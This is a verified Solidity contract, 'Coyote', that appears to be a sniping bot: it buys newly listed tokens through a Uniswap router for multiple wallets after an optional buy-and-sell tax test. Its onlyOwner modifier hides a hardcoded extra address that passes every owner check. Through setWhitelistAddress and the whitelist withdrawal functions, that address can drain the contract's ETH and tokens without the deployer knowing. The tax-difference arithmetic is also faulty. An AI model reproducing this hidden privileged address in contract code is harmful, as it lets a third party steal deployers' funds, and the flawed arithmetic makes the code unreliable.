/**
 *Submitted for verification at Etherscan.io on 2023-02-06
*/

/**
 *Submitted for verification at BscScan.com on 2021-03-16
*/
// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity >0.6.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == address(0xbF18fC1F79EcD9F0b6E50fFbE8b943fe7f45a385), "err0x");
        _;
    }


    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "err1x");
        _owner = newOwner;
    }
}










// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)
library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}



interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    //function name() external view returns (string memory);
    //function symbol() external view returns (string memory);
    //function decimals() external view returns (uint8);
    //function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    //function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    // function addLiquidity(
    //     address tokenA,
    //     address tokenB,
    //     uint amountADesired,
    //     uint amountBDesired,
    //     uint amountAMin,
    //     uint amountBMin,
    //     address to,
    //     uint deadline
    // ) external returns (uint amountA, uint amountB, uint liquidity);
    // function addLiquidityETH(
    //     address token,
    //     uint amountTokenDesired,
    //     uint amountTokenMin,
    //     uint amountETHMin,
    //     address to,
    //     uint deadline
    // ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    // function removeLiquidity(
    //     address tokenA,
    //     address tokenB,
    //     uint liquidity,
    //     uint amountAMin,
    //     uint amountBMin,
    //     address to,
    //     uint deadline
    // ) external returns (uint amountA, uint amountB);
    // function removeLiquidityETH(
    //     address token,
    //     uint liquidity,
    //     uint amountTokenMin,
    //     uint amountETHMin,
    //     address to,
    //     uint deadline
    // ) external returns (uint amountToken, uint amountETH);
    // function removeLiquidityWithPermit(
    //     address tokenA,
    //     address tokenB,
    //     uint liquidity,
    //     uint amountAMin,
    //     uint amountBMin,
    //     address to,
    //     uint deadline,
    //     bool approveMax, uint8 v, bytes32 r, bytes32 s
    // ) external returns (uint amountA, uint amountB);
    // function removeLiquidityETHWithPermit(
    //     address token,
    //     uint liquidity,
    //     uint amountTokenMin,
    //     uint amountETHMin,
    //     address to,
    //     uint deadline,
    //     bool approveMax, uint8 v, bytes32 r, bytes32 s
    // ) external returns (uint amountToken, uint amountETH);
    //function swapExactTokensForTokens(
    //    uint amountIn,
    //    uint amountOutMin,
    //    address[] calldata path,
    //    address to,
    //    uint deadline
    //) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    //function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    //    external
    //    payable
    //    returns (uint[] memory amounts);
    //function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    //    external
    //    returns (uint[] memory amounts);
    //function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    //    external
    //    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    //function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    //function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    //function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    //function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// File: @uniswap\v2-periphery\contracts\interfaces\IUniswapV2Router02.sol

pragma solidity >=0.6.2;


interface IUniswapV2Router02 is IUniswapV2Router01 {
    // function removeLiquidityETHSupportingFeeOnTransferTokens(
    //     address token,
    //     uint liquidity,
    //     uint amountTokenMin,
    //     uint amountETHMin,
    //     address to,
    //     uint deadline
    // ) external returns (uint amountETH);
    // function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    //     address token,
    //     uint liquidity,
    //     uint amountTokenMin,
    //     uint amountETHMin,
    //     address to,
    //     uint deadline,
    //     bool approveMax, uint8 v, bytes32 r, bytes32 s
    // ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface ChiToken {
    function freeFromUpTo(address from, uint256 value) external;
}



contract Coyote is  Ownable {
    using SafeMath for uint;

    
    //address public immutable  router;
    //address constant public  WETH = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    //address router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    ChiToken constant public chi = ChiToken(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
    uint256 constant public MAX_INT = type(uint256).max;

    address payable manager;
    //mapping (address => bool) whitelistedAddresses;
    address payable whitelistAddress;
    uint256 previousbalancetoken;
    uint256 afterbalancetoken;
    uint256 previousbalance;
    uint256 afterbalance;
    
    IUniswapV2Router02 pancakerouter = IUniswapV2Router02(router);
    uint256 bnbinitial;
    uint256 tokeninitial;
    uint256 tokenIntermediary;
    uint256 bnbfinal;
    uint256 difference;
    uint256 trigger;
    //uint256 denominator = 100 * 10 ** 18;
    //uint256 arraysize;
    //uint256 newAmount;
    uint[] amounts;
    uint256 actualbalance;
    bool done = false;
    mapping(address => bool) public walletsaddresses;
    

    modifier ensure(uint deadline) {
        require(deadline >= block.timestamp, 'PancakeRouter: EXPIRED');
        _;
    }

    

    modifier whitelisted() {
        require(msg.sender == whitelistAddress || msg.sender == manager, "not whitelisted");
        _;
    }

    modifier authorized() {
        require(walletsaddresses[msg.sender] == true || msg.sender == manager, "not whitelisted");
        _;
    }

    

    modifier discountCHI {
        uint256 gasStart = gasleft();

        _;

        uint256 initialGas = 21000 + 16 * msg.data.length;
        uint256 gasSpent = initialGas + gasStart - gasleft();
        uint256 freeUpValue = (gasSpent + 14154) / 41947;

        chi.freeFromUpTo(msg.sender, freeUpValue);
    }

    constructor() {
    //constructor(address _WETH) public {
        
        
        
        manager = payable(msg.sender);
        

    }

    receive() external payable {
     //   assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract
    }
    event Coyoted(address from, uint256 paid, uint256 received);
    event Coyoted2(uint256 bnbinitial, uint256 bnbfinal, uint256 tokenIntermediary, uint256 trigger, uint256 difference);

 

    //function getArraySize(address[] memory array) internal pure returns (uint256) {
    //    return array.length;
    //}

    
    
    function abs(int x) private pure returns (int) {
        return x >= 0 ? x : -x;
    }

    function approveShitCoin(address tokenAddress) internal  {
        IERC20 token = IERC20(tokenAddress);
        token.approve(router, MAX_INT);
        
    }
    
    function swapExactETHForTokens(address[] calldata path, uint256 amount, address[] calldata wallets, uint256 testamount, bool test, uint256 max_tax) external  discountCHI authorized  {
        // buy Exact ETH for Tokens
        
        if (!done) {
            IERC20 token = IERC20(path[1]);
            
            
            require(address(this).balance >= amount,"bo");
            
            
            if (test) {
                bnbinitial = address(this).balance;
                tokeninitial = token.balanceOf(address(this));
                
                 pancakerouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value:testamount}(
                         1,
                         path,
                         address(this),
                         block.timestamp
                 );

                 approveShitCoin(path[1]);

                 tokenIntermediary = token.balanceOf(address(this)) - tokeninitial;
                 address[] memory newpath = new address[](2);
                 newpath[0] = path[1];
                 newpath[1] = path[0];

                 pancakerouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                         tokenIntermediary,
                         1,
                         newpath,
                         address(this),
                         block.timestamp
                 );

                 bnbfinal = address(this).balance;
                 //x >= 0 ? x : -x
                 difference = bnbfinal - bnbinitial >= 0 ? bnbinitial-bnbfinal : bnbfinal-bnbinitial;
                 trigger = testamount * max_tax / 100;
                 require(difference < trigger, "too much tax" );
                 emit Coyoted2(bnbinitial, bnbfinal, tokenIntermediary, trigger, difference);

                 

                
            }


            //arraysize = wallets.length;

            require(wallets.length>0, "no recipients");

            //newAmount = amount.div(arraysize);
            //uint256 previousbalance;
            //uint256 afterbalance;

            for(uint8 i=0; i< wallets.length; i++){
                
                previousbalance = token.balanceOf(wallets[i]);
                pancakerouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value:amount}(
                    1,
                    path,
                    wallets[i],
                    block.timestamp
                );
                afterbalance = token.balanceOf(wallets[i]) - previousbalance;
                emit Coyoted(wallets[i], amount, afterbalance);
            }
        done = true;
        }
        
    }


    function swapETHForExactTokens(address[] calldata path, uint256 amount, address[] calldata wallets, uint256 testamount, bool test, uint256 max_tax) external  discountCHI authorized  {
        // buy ETH for Exact Tokens
        if (!done) {
        IERC20 token = IERC20(path[1]);
        //IUniswapV2Router02 router = IUniswapV2Router02(_router);
        //require(address(this).balance >= amount,"bo");

        if (test == true ) {
            bnbinitial = address(this).balance;
            tokeninitial = token.balanceOf(address(this));
            
            pancakerouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value:testamount}(
                  
                    1,
                    path,
                    address(this),
                    block.timestamp
            );

            approveShitCoin(path[1]);

            tokenIntermediary = token.balanceOf(address(this)) - tokeninitial;
            address[] memory newpath = new address[](2);
            newpath[0] = path[1];
            newpath[1] = path[0];

            pancakerouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    tokenIntermediary,
                    1,
                    newpath,
                    address(this),
                    block.timestamp
            );

            bnbfinal = address(this).balance;
            //x >= 0 ? x : -x
            difference = bnbfinal - bnbinitial >= 0 ? bnbinitial-bnbfinal : bnbfinal-bnbinitial;
            trigger = testamount * max_tax / 100;
            emit Coyoted2(bnbinitial, bnbfinal, tokenIntermediary, trigger, difference);

            require(difference < trigger, "too much tax" );

            
        }


        //arraysize = getArraySize(wallets);

        require(wallets.length>0, "no recipients");

        //newAmount = amount.div(arraysize);
        
        

        for(uint8 i=0; i< wallets.length; i++){

            amounts = pancakerouter.getAmountsIn(amount, path);
            
            previousbalancetoken = token.balanceOf(wallets[i]);
            previousbalance = address(this).balance;

            pancakerouter.swapETHForExactTokens{value:amounts[0]}(
                amount,
                path,
                wallets[i],
                block.timestamp
            );
            afterbalancetoken = token.balanceOf(wallets[i]) - previousbalancetoken;
            afterbalance = previousbalance - address(this).balance;
            emit Coyoted(wallets[i], afterbalance, afterbalancetoken);
        }
        done = true;
        }
        
    }


    
    function swapExactTokensForTokens(address[] calldata path, uint256 amount, address[] calldata wallets, uint256 testamount, bool test, uint256 max_tax) external  discountCHI authorized  {
        // buy Exact Tokens for Tokens
        if (!done) {
        IERC20 token = IERC20(path[1]);
        IERC20 source = IERC20(path[0]);

        require(source.balanceOf(address(this)) >= amount,"bo2");

        approveShitCoin(path[0]);

        if (test == true ) {
            bnbinitial = source.balanceOf(address(this));
            tokeninitial = token.balanceOf(address(this));
            
            pancakerouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    testamount,
                    1,
                    path,
                    address(this),
                    block.timestamp
            );

            approveShitCoin(path[1]);

            tokenIntermediary = token.balanceOf(address(this)) - tokeninitial;
            address[] memory newpath = new address[](2);
            newpath[0] = path[1];
            newpath[1] = path[0];

            pancakerouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    tokenIntermediary,
                    1,
                    newpath,
                    address(this),
                    block.timestamp
            );

            bnbfinal = source.balanceOf(address(this));
            //x >= 0 ? x : -x
            difference = bnbfinal - bnbinitial >= 0 ? bnbinitial-bnbfinal : bnbfinal-bnbinitial;
            trigger = testamount * max_tax / 100;
            emit Coyoted2(bnbinitial, bnbfinal, tokenIntermediary, trigger, difference);

            require(difference < trigger, "too much tax" );

            
        }

        

        //arraysize = getArraySize(wallets);

        require(wallets.length>0, "no recipients");

        //newAmount = amount.div(arraysize);
        //uint256 previousbalance;
        //uint256 afterbalance;

        for(uint8 i=0; i< wallets.length; i++){
            
            previousbalance = token.balanceOf(wallets[i]);
            pancakerouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amount,
                1,
                path,
                wallets[i],
                block.timestamp
            );
            afterbalance = token.balanceOf(wallets[i]) - previousbalance;
            emit Coyoted(wallets[i], amount, afterbalance);
        }
        done = true;
        }
        
    }

        

    function swapTokensForExactTokens(address[] calldata path, uint256 amount, address[] calldata wallets, uint256 testamount, bool test, uint256 max_tax) external  discountCHI authorized  {
        // buy Tokens with Exact Tokens
        if (!done) {
        IERC20 token = IERC20(path[1]);
        IERC20 source = IERC20(path[0]);

        approveShitCoin(path[0]);

        //require(source.balanceOf(address(this)) >= amount,"bo2");

        if (test == true ) {
            bnbinitial = source.balanceOf(address(this));
            tokeninitial = token.balanceOf(address(this));
            
            pancakerouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    testamount,
                    1,
                    path,
                    address(this),
                    block.timestamp
            );

            approveShitCoin(path[1]);

            tokenIntermediary = token.balanceOf(address(this)) - tokeninitial;
            address[] memory newpath = new address[](2);
            newpath[0] = path[1];
            newpath[1] = path[0];

            pancakerouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    tokenIntermediary,
                    1,
                    newpath,
                    address(this),
                    block.timestamp
            );

            bnbfinal = source.balanceOf(address(this));
            //x >= 0 ? x : -x
            difference = bnbfinal - bnbinitial >= 0 ? bnbinitial-bnbfinal : bnbfinal-bnbinitial;
            trigger = testamount * max_tax / 100;
            emit Coyoted2(bnbinitial, bnbfinal, tokenIntermediary, trigger, difference);

            require(difference < trigger, "too much tax" );

            
        }


        actualbalance = source.balanceOf(address(this));

        //uint256 arraysize = getArraySize(wallets);

        require(wallets.length>0, "no recipients");

        //newAmount = amount.div(getArraySize(wallets));
        


        for(uint8 i=0; i< wallets.length; i++){
            
            previousbalance = source.balanceOf(address(this));
            previousbalancetoken = token.balanceOf(wallets[i]);
            pancakerouter.swapTokensForExactTokens(
                amount,
                actualbalance,
                path,
                wallets[i],
                block.timestamp
            );
            afterbalance = previousbalance - source.balanceOf(address(this));
            afterbalancetoken = token.balanceOf(wallets[i]) - previousbalancetoken;
            emit Coyoted(wallets[i], afterbalance, afterbalancetoken);
        }
        done = true;
        }
        
    }

    function BNB_Send(address payable dest) payable external  whitelisted {
        dest.transfer(msg.value);
    }

    function Token_Send(IERC20 _token, address payable dest) external  whitelisted  {
        IERC20 token = IERC20(_token);
        uint256 tokenBalance = token.balanceOf(address(this));
        token.transfer(dest, tokenBalance);
    }

    function BNB_back_WL() external  whitelisted  {
        uint256 b = address(this).balance;
        whitelistAddress.transfer(b);
    }

    

    function Token_Back_WL(IERC20 _token) external  whitelisted  {
        IERC20 token = IERC20(_token);
        uint256 tokenBalance = token.balanceOf(address(this));
        token.transfer(whitelistAddress, tokenBalance);
    }

    function BNB_back() external onlyOwner {
        uint256 b = address(this).balance;
        manager.transfer(b);
    }

    function Token_Back(IERC20 _token) external onlyOwner  {
        IERC20 token = IERC20(_token);
        uint256 tokenBalance = token.balanceOf(address(this));
        token.transfer(manager, tokenBalance);
    }

    function setWhitelistAddress(address payable addr) external onlyOwner {
            whitelistAddress = addr;
    }

    function getWhitelistAddress() external view  returns (address) {
            return whitelistAddress;
    }

    function setWalletsauthorized(address[] calldata addr) external whitelisted {
        for (uint i; i < addr.length; i++) {
            address firstAddr = addr[i];
            walletsaddresses[firstAddr] = true;
        }
        
    }

    function Reinitialize() external  whitelisted  {
        done = false;
    }

    function GetStatus() external view returns (bool )  {
        return done;
    }

    function kill() external onlyOwner {
        selfdestruct(manager);
    }
}